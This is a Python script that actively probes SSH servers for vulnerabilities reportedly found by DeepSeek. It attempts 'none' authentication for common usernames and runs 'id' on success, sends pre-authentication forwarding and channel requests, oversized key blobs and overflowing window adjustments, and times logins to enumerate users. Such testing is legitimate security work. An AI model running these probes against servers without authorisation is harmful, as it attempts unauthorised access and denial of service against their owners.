#!/usr/bin/env python3
"""
Test novel DeepSeek SSH findings against real servers.
Uses paramiko for proper SSH protocol handling.

Usage: python probe_deepseek_ssh.py <host> <port> [username] [password]
"""

import paramiko
import socket
import struct
import sys
import time


def test_none_auth(host, port):
    """
    Finding: None Authentication Method Abuse (critical)
    Can we authenticate with method='none' and get a shell?
    """
    print("=" * 60)
    print("TEST 1: 'none' Authentication Method")
    print("=" * 60)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    t = paramiko.Transport(sock)
    t.start_client()

    # Try auth_none with various usernames
    for user in ['root', 'admin', 'test', 'guest', 'nobody', '']:
        try:
            t2 = None
            if user != 'root':  # reuse transport only for first
                sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock2.settimeout(10)
                sock2.connect((host, port))
                t2 = paramiko.Transport(sock2)
                t2.start_client()
            else:
                t2 = t

            t2.auth_none(user if user else 'root')
            print(f"  [VULNERABLE!] auth_none accepted for user '{user}'!")
            try:
                chan = t2.open_session()
                chan.exec_command('id')
                chan.settimeout(3)
                out = chan.recv(1024).decode(errors='replace').strip()
                print(f"    Got shell: {out}")
                chan.close()
            except:
                print(f"    Auth succeeded but no shell")
            if t2 != t:
                t2.close()
            break
        except paramiko.BadAuthenticationType as e:
            if user == 'root':
                print(f"  root: methods={e.allowed_types}")
        except paramiko.AuthenticationException:
            pass
        except paramiko.SSHException as e:
            if t2 and t2 != t:
                try: t2.close()
                except: pass
            break

    t.close()
    sock.close()
    print()


def test_global_request_preauth(host, port):
    """
    Finding: Global Request Before Authentication (high)
    Send tcpip-forward before completing auth.
    """
    print("=" * 60)
    print("TEST 2: Global Request (tcpip-forward) Pre-Auth")
    print("=" * 60)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    t = paramiko.Transport(sock)
    t.start_client()

    # DON'T authenticate — try global request immediately after KEX
    print("  Sending tcpip-forward without authentication...")
    try:
        port_assigned = t.request_port_forward("127.0.0.1", 0)
        if port_assigned:
            print(f"  [VULNERABLE!] Pre-auth port forward accepted! Port {port_assigned}")
            t.cancel_port_forward("127.0.0.1", port_assigned)
        else:
            print(f"  Port forward returned None (rejected)")
    except paramiko.SSHException as e:
        print(f"  [OK] Rejected: {e}")
    except Exception as e:
        print(f"  Error: {e}")

    # Also try opening a channel pre-auth
    print("  Sending channel open without authentication...")
    try:
        chan = t.open_session()
        if chan:
            print(f"  [VULNERABLE!] Pre-auth session channel opened!")
            chan.close()
    except paramiko.ChannelException as e:
        print(f"  [OK] Channel rejected: {e.args}")
    except paramiko.SSHException as e:
        print(f"  [OK] Rejected: {e}")

    t.close()
    sock.close()
    print()


def test_oversized_pk_blob(host, port):
    """
    Finding: Oversized Public Key Blob in Authentication (medium)
    Send auth request with huge public key blob.
    """
    print("=" * 60)
    print("TEST 3: Oversized Public Key Blob")
    print("=" * 60)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    t = paramiko.Transport(sock)
    t.start_client()

    # We need to send a raw SSH_MSG_USERAUTH_REQUEST with a huge PK blob
    # paramiko won't let us do this directly, so craft via internal API

    # First probe to get transport into auth state
    try:
        t.auth_none('test')
    except:
        pass

    # Now send crafted auth request with oversized PK blob
    sizes = [1024, 4096, 16384, 65536, 262144]
    for size in sizes:
        try:
            m = paramiko.message.Message()
            m.add_byte(bytes([50]))  # SSH_MSG_USERAUTH_REQUEST
            m.add_string('test')
            m.add_string('ssh-connection')
            m.add_string('publickey')
            m.add_boolean(False)  # no signature, just checking
            m.add_string('ssh-rsa')
            m.add_string(b'A' * size)  # oversized PK blob
            t._send_message(m)
            time.sleep(0.3)
            print(f"  {size:>7d} byte PK blob: sent OK (connection alive)")
        except Exception as e:
            print(f"  {size:>7d} byte PK blob: ERROR — {e}")
            break

    # Check if still alive
    try:
        m = paramiko.message.Message()
        m.add_byte(bytes([50]))  # SSH_MSG_USERAUTH_REQUEST
        m.add_string('test')
        m.add_string('ssh-connection')
        m.add_string('none')
        t._send_message(m)
        time.sleep(0.5)
        print(f"  Connection still alive after oversized blobs")
    except:
        print(f"  Connection died after oversized blobs")

    t.close()
    sock.close()
    print()


def test_window_overflow(host, port, username=None, password=None):
    """
    Finding: Window Adjustment Overflow (low)
    Send window adjust that overflows uint32.
    """
    print("=" * 60)
    print("TEST 4: Channel Window Adjustment Overflow")
    print("=" * 60)

    if not username or not password:
        print("  [SKIP] Needs credentials")
        print()
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, port=port, username=username, password=password,
                timeout=10, allow_agent=False, look_for_keys=False)
    transport = ssh.get_transport()

    # Open a session
    chan = transport.open_session()
    print(f"  Channel opened, local window: {chan.in_window_size}")

    # Send a window adjust that would overflow uint32
    # SSH_MSG_CHANNEL_WINDOW_ADJUST = 93
    # Format: uint32 recipient_channel + uint32 bytes_to_add
    try:
        m = paramiko.message.Message()
        m.add_byte(bytes([93]))  # SSH_MSG_CHANNEL_WINDOW_ADJUST
        m.add_int(chan.remote_chanid)
        m.add_int(0xFFFFFFFF)  # max uint32
        transport._send_message(m)
        time.sleep(0.5)

        # Send another one to overflow
        m = paramiko.message.Message()
        m.add_byte(bytes([93]))
        m.add_int(chan.remote_chanid)
        m.add_int(0xFFFFFFFF)
        transport._send_message(m)
        time.sleep(0.5)

        # Check if connection survived
        chan.exec_command('echo alive')
        chan.settimeout(3)
        out = chan.recv(1024).decode(errors='replace').strip()
        print(f"  After 2x 0xFFFFFFFF window adjust: {out}")
        if out == 'alive':
            print(f"  [OK] Server handled overflow correctly")
        chan.close()
    except Exception as e:
        print(f"  [!!] Connection error after overflow: {e}")

    ssh.close()
    print()


def test_banner_injection(host, port):
    """
    Finding: Banner Injection via Terminal Control Characters (medium)
    Check if the server banner contains any control characters.
    """
    print("=" * 60)
    print("TEST 5: Banner / Control Character Analysis")
    print("=" * 60)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # Read banner
    banner = b''
    while not banner.endswith(b'\n'):
        chunk = sock.recv(1024)
        if not chunk:
            break
        banner += chunk

    banner_str = banner.decode('utf-8', errors='replace').strip()
    print(f"  Banner: {repr(banner_str)}")

    # Check for control characters
    control_chars = [c for c in banner_str if ord(c) < 32 and c not in '\r\n']
    if control_chars:
        print(f"  [FINDING] Banner contains control characters: {[hex(ord(c)) for c in control_chars]}")
    else:
        print(f"  [OK] No control characters in banner")

    sock.close()

    # Also check the SSH auth banner (post-KEX, pre-auth)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    t = paramiko.Transport(sock)
    t.start_client()

    # Get the auth banner by trying auth
    auth_banner = None
    try:
        t.auth_none('test')
    except paramiko.BadAuthenticationType:
        pass
    except paramiko.AuthenticationException:
        pass

    # Check transport for banner
    banner_msg = getattr(t, '_Transport__banner', None) or getattr(t, 'banner', None)
    if banner_msg:
        print(f"  Auth banner: {repr(str(banner_msg)[:200])}")
    else:
        print(f"  No auth banner sent")

    t.close()
    sock.close()
    print()


def test_timing_sidechannel(host, port):
    """
    Finding: Timing Side-Channel in Public Key Authentication (medium)
    Measure response time for valid vs invalid usernames.
    """
    print("=" * 60)
    print("TEST 6: Timing Side-Channel in Authentication")
    print("=" * 60)

    users = ['root', 'test', 'nonexistent_user_xyz_12345', 'admin', 'nobody']
    timings = {}

    for user in users:
        times = []
        for _ in range(3):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            t = paramiko.Transport(sock)
            t.start_client()

            t0 = time.monotonic()
            try:
                t.auth_password(user, 'wrong_password_deliberate')
            except paramiko.AuthenticationException:
                pass
            except paramiko.SSHException:
                pass
            elapsed = time.monotonic() - t0
            times.append(elapsed)

            t.close()
            sock.close()
            time.sleep(0.1)

        avg = sum(times) / len(times)
        timings[user] = avg
        print(f"  {user:30s}: avg {avg:.3f}s ({', '.join(f'{t:.3f}' for t in times)})")

    # Check for significant timing differences
    values = list(timings.values())
    if max(values) > min(values) * 1.5:
        slow = max(timings, key=timings.get)
        fast = min(timings, key=timings.get)
        print(f"\n  [FINDING] Timing difference: {slow} ({timings[slow]:.3f}s) vs {fast} ({timings[fast]:.3f}s)")
        print(f"           Ratio: {timings[slow]/timings[fast]:.1f}x — may enable user enumeration")
    else:
        print(f"\n  [OK] Timing is consistent (no significant user enumeration)")
    print()


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port> [username] [password]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3] if len(sys.argv) > 3 else None
    password = sys.argv[4] if len(sys.argv) > 4 else None

    print(f"\nDeepSeek SSH Novel Findings Probe — {host}:{port}\n")

    test_none_auth(host, port)
    test_global_request_preauth(host, port)
    test_oversized_pk_blob(host, port)
    test_window_overflow(host, port, username, password)
    test_banner_injection(host, port)
    test_timing_sidechannel(host, port)

    print("=" * 60)
    print("PROBES COMPLETE")
    print("=" * 60)


if __name__ == "__main__":
    main()
